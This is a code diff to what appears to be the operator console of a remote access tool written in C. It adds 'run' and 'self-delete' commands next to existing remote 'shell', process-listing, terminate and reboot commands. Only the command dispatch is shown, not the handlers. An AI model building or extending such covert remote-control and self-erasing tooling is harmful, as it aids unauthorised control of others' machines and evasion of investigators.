@@ -107,7 +107,11 @@ ACCEPT:
 		fgets(cmd,BUFFER_SIZE,stdin);
 		cmd[strcspn(cmd, "\n")] = '\0';
 
-		if ( strcmp(cmd,"lspid") == 0){
+		if ( strcmp(cmd,"help") == 0){
+			PrintHelp();
+			continue;
+		}
+		else if ( strcmp(cmd,"lspid") == 0){
 			printf("going to Handle func\n");
 			HandleLspid(cmd,client_socket);
 			continue;
@@ -115,6 +119,11 @@ ACCEPT:
 		else if ( strcmp(cmd,"shell") == 0){
 			printf("going to Handle func\n");
 			HandleShell(cmd,client_socket);
+			continue;
+		}
+		else if (strncmp(cmd,"run",3) == 0){
+			printf("going to Handle func\n");
+			HandleStartProcess(cmd,client_socket);
 			continue;
 		}
 		else if ( strncmp(cmd,"terminate",9) == 0){
@@ -249,6 +258,10 @@ ACCEPT:
 			continue;
 
 		}
+		else if (strcmp(cmd,"self-delete") == 0){
+			HandleSelfDelete(cmd,client_socket);
+			continue;
+		}
 		else if ( strcmp(cmd,"reboot") == 0){
 			printf("going to Handle func\n");
 			HandleReboot(cmd,client_socket);
@@ -258,13 +271,14 @@ ACCEPT:
 		}
 
 		else if ( strcmp(cmd,"exit") == 0){
-			printf("This should exit\n");
+			printf("[+] Exiting\n");
 			shutdown(client_socket,SHUT_RDWR);
 			close(client_socket);
 			break;
 			
 		}
 		else{
+			printf("[x] Invalid Command, Type help for menu\n");
 			continue;
 		}
 
